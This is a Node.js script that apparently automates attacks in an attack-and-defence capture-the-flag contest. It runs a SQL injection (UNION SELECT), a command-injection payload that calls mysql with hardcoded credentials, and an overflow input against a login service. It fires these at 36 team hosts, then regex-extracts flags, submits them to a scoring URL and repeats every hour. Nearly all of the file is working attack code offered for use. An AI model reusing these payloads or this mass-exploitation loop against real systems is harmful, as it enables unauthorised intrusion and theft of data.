var http = require('http');
var net = require('net');
var colors = require('colors');
var exec = require('child_process').exec;
var schedule = require('node-schedule');
var program = require('commander');


// submit flag
var submit = function (flag) {
    var url = "http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/process.php?ID=13&key=" + flag.toString();
    var req = http.request(url);
    req.on('error', function(e) {
      console.log('SUBMIT ERROR: '.red + e.message);
    });
    req.end();
}

var parseFlag = function (regex, data) {
    match = data.toString().match(regex);
    if (match) {
        var flag = match[1];
        return match[1];
    }
}


//
//  PMC name search injection
//

// regex for flag scrawling
var pmcNameSearchInjectionRegex = /\>\d* (\w*)\<\/div\>/;
var pmcNameSearchInjection = function (team) {
    var url = "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
    var req = http.request(url, function (res) {
        res.setEncoding('utf8');
        res.on('data', function (data) {
            flag = parseFlag(pmcNameSearchInjectionRegex, data)
            if (flag) {
                console.log('FLAG: '.yellow, team, flag);
                submit(flag);
                req.destroy();
            }
        });

    });
    req.on('error', function(e) {
        console.log('ERROR: '.red + e.message);
        req.destroy();
    });
    req.setTimeout(10000, function () {
        console.log('TIMEOUT: '.red);
        req.destroy();
    });
    req.end();
}


//
//  PMC db passthru shit
//

var pmcDBPassthruRegex = /id\s+flag\s*\d+\s*(\w+)/
var pmcDBPassthru = function (team) {
    var url = "http://10.8." + team.toString() + ".100:7788/menu.php/db/passthru/?=;%20mysql%20-D%20pmc%20-u%20joy%20-pchansey%20-e%20%22SELECT%20*%20from%20flag%22";
    var req = http.request(url, function (res) {
        res.setEncoding('utf8');
        res.on('data', function (data) {
            flag = parseFlag(pmcDBPassthruRegex, data)
            if (flag) {
                console.log('FLAG: '.yellow, team, flag);
                submit(flag);
                req.destroy();
            }
        });

    });
    req.on('error', function(e) {
        console.log('ERROR: '.red + e.message);
        req.destroy();
    });
    req.setTimeout(10000, function () {
        console.log('TIMEOUT: '.red);
        req.destroy();
    });
    req.end();
}


//
//  SSP login buffer overflow Attack
//

var sspLoginBufferOverflowRegex = /Exit\n#(\w+)/
var sspLoginBufferOverflow = function (team) {
    var target = {
        port: 5566,
        host: '10.8.' + team.toString() + '.100'
    };

    var req = net.connect(target, function () {
        req.write('11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1\n3\n8\n');
    });

    req.on('data', function(data) {
        result = parseFlag(sspLoginBufferOverflowRegex, data);
        if (result) {
            console.log('Flag: '.yellow, team, result);
            submit(result);
            req.destroy();
        }
    });
    req.on('error', function(e) {
        console.log('ERROR: '.red + e.message);
        req.destroy();
    });
    req.setTimeout(10000, function () {
        console.log('TIMEOUT: '.red);
        req.destroy();
    });

};

var attackAll = function () {
    console.log('====== START ATTACKING ====='.red);
    for (i = 0; i < 36; i++) {
        pmcNameSearchInjection(i);
        pmcDBPassthru(i);
        sspLoginBufferOverflow(i);
    }
};

// main
var rule = new schedule.RecurrenceRule();
rule.minute = 0;

program
    .version('0.0.1')
    .option('-n, --now', 'Attack all attack NOW!!')
    .option('-m, --minute <n>', 'The minute to attack at every hour', parseInt)
    .parse(process.argv);

if (program.minute) {
    if (typeof program.minute === 'number') {
        rule.minute = program.minute;
        console.log('Attack at __:' + program.minute);
    }
}

if (program.now) {
    attackAll(program);
} else {
    var j = schedule.scheduleJob(rule, attackAll);
}
